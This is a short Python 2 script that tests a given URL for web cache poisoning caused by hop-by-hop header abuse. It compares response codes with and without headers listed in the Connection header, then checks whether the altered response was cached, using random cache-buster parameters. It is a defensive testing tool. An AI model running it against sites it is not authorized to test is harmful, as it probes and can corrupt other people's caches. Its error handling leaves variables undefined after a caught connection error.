import requests
import random
import string
from argparse import ArgumentParser


parser = ArgumentParser(description="Attempts to find cache poisoning caused by hop-by-hop header abuse against the provided URL.")
parser.add_argument("-u", "--url", help="URL to target (without query string)")
parser.add_argument("-x", "--headers", default="X-Forwarded-Proto", help="A comma separated list of headers to add as hop-by-hop")

args = parser.parse_args()

if not args.url:
    print('Must supply a URL to target')
    exit(1)

letters = string.ascii_lowercase

headers = {
    'Connection': 'close, %s' % args.headers
}
params1 = {
    'cb': ''.join(random.choice(letters) for i in range(10))
}
params2 = {
    'cb': ''.join(random.choice(letters) for i in range(10))
}

# try a normal request and one with the hop-by-hop headers (and a cache buster to avoid real poisoning)
try:
    req1 = requests.get(args.url, params=params1, allow_redirects=False)
    req2 = requests.get(args.url, headers=headers, params=params2, allow_redirects=False)
except requests.exceptions.ConnectionError as e:
    pass

# if HbH headers cause a different response code, try and see if we poisoned cache
if req1.status_code != req2.status_code:
    print '%s normally returns a %s, but returned a %s with the hop-by-hop headers of "%s"' % (args.url, req1.status_code, req2.status_code, args.headers)
    try:
        req3 = requests.get(args.url, params=params2, allow_redirects=False)
    except requests.exceptions.ConnectionError as e:
        pass
    if req3.status_code == req2.status_code:
        print '%s?cb=%s poisoned?' % (args.url, params2['cb'])
else:
    print '%s did NOT return a different status code with the hop-by-hop headers "%s"' % (args.url, args.headers)
